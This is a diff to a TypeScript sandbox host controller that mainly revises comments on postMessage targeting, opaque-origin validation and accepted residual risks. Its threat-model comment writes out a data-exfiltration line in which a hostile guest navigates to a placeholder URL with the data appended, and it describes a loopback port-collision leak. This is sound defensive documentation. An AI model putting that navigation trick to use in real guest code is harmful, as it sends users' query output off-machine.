@@ -2,17 +2,46 @@
  * quick-studio UI (Ring 2) — the sandbox host controller (Story 5.5).
  *
  * The Ring 2 side of the one-way `postMessage` channel to the Ring 3 guest. It pushes
- * already-public {@link FrozenData} INTO the guest and routes the guest's outbound
- * SIGNALS ({@link SandboxOutbound}) to `onSignal`. It never returns data in response to
- * a guest message — there is no data-reply path here at all.
+ * the render doc — the user's own query output as canonical {@link FrozenData} — INTO
+ * the guest and routes the guest's outbound SIGNALS ({@link SandboxOutbound}) to
+ * `onSignal`. It never returns data in response to a guest message — there is no
+ * data-reply path here at all.
  *
  * The cross-origin `targetOrigin` nuance (get this wrong and containment leaks): the
  * guest runs under `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, so its origin
  * is OPAQUE ("null"). Therefore (1) `pushDoc` posts with `targetOrigin: "*"` — you
- * cannot target an opaque origin, and `"*"` is safe because delivery is confined to
- * that ONE iframe window and the payload is only already-public frozen data (never a
- * secret); and (2) inbound is validated by window IDENTITY (`event.source ===
- * iframeWindow`) plus the opaque `"null"` origin — never by an origin string.
+ * cannot target an opaque origin by origin string, so `"*"` is mandatory rather than
+ * lax, and what actually bounds delivery is that it goes to ONE window handle: this
+ * iframe's `contentWindow` and nothing else; and (2) inbound is validated by window
+ * IDENTITY (`event.source === iframeWindow`) plus the opaque `"null"` origin — never by
+ * an origin string.
+ *
+ * The residual, recorded rather than papered over (DW-47): what lands in the guest is the
+ * real output of the query the user just ran — the same rows they are looking at in the
+ * results pane — and calling it harmless because it is "already visible" understates it,
+ * which is what an earlier version of this comment did. The guest's `connect-src 'none'`
+ * blocks scripted REQUESTS but not scripted same-frame NAVIGATION, so a hostile guest
+ * could still carry that payload off-machine as `window.location = "http://…/?" + data`.
+ * That is ACCEPTED: the recipient is the operator's own already-visible output, the
+ * guest receives no token, no connection handle and no way to ask for more, and the
+ * alternatives (a `pushDoc` handshake gated on a guest `ready` signal, or leaning on the
+ * embedder's `frame-src` as a navigation control) cost more than the exposure is worth.
+ * The canonical record of that trade — including what the shell's `frame-src` DOES
+ * already mitigate — lives on `GUEST_CSP` in `core/sandbox-server.ts`; keep this a
+ * pointer rather than a second copy that can drift. REVISIT if untrusted or shared
+ * reports are ever introduced — the moment a guest can render data the viewer does not
+ * already hold, "exfiltrating it to yourself" stops describing the threat.
+ *
+ * One case where the window handle and the intended DOCUMENT come apart, recorded because
+ * this controller is where the data actually leaves Ring 2: with the Core exposed
+ * (`QS_HOST` non-loopback) the injected sandbox origin is loopback, so a REMOTE viewer's
+ * iframe resolves it against THEIR machine. If something unrelated is listening on that
+ * ephemeral port, the frame loads a foreign document — one serving its own headers, so
+ * none of `GUEST_CSP` applies to it — and `pushDoc` posts the render frame into it. The
+ * recipient is a process on the viewer's own box rather than a remote attacker, which is
+ * why this is a residual and not a stop-ship, but it is emphatically not "delivery is
+ * confined to our guest". It is also a further reason the sandbox refuses to bind
+ * off-loopback (DW-48): the exposed configuration is already the degraded one.
  *
  * Pure + injectable (no `document`): the React `SandboxFrame` seam owns the real
  * `window` listener and hands events to `handleMessage`. No `ai`/`@ai-sdk` import.
@@ -113,8 +142,15 @@ export function createSandboxHost(deps: SandboxHostDeps): SandboxHost {
       chart: doc.chart,
       data: doc.data,
     };
-    // `"*"` is required: an opaque-origin guest cannot be addressed by origin string.
-    // Delivery is still confined to this one iframe window; the payload is public data.
+    // `"*"` is required, not permissive: an opaque-origin guest cannot be addressed by
+    // origin string at all, so this is the only expressible target. The bound on delivery
+    // is the WINDOW HANDLE — `iframeWindow` is this one guest frame, so no OTHER window
+    // (sibling frame, opener, embedder) receives it. Note what that does and does not
+    // promise: it pins the window, not the DOCUMENT currently loaded in it, and the
+    // `"*"` target means we never check who answered. See the module docstring for the
+    // exposed-mode case where those come apart. The payload is the user's own query
+    // output (canonical DW-47 record: `GUEST_CSP` in `core/sandbox-server.ts`); it is not
+    // a secret, but it is not "public" either.
     iframeWindow.postMessage(frame, "*");
   }
 
